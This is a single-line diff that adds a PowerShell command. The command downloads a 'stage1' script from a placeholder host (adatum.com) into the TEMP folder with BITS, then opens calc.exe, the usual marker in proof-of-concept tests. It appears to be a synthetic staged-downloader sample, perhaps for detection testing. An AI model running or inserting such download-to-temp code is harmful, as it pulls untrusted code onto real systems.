@@ -1,0 +1,1 @@
+$RemoteUrl = 'https://adatum.com:8443/stage1.ps1'; $Stage2Path = "$env:TEMP\stage1.bin"; $TimeoutSec = 124; Start-BitsTransfer -Source $RemoteUrl -Destination $Stage2Path; Start-Process -FilePath "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Set-Location -Path $env:TEMP
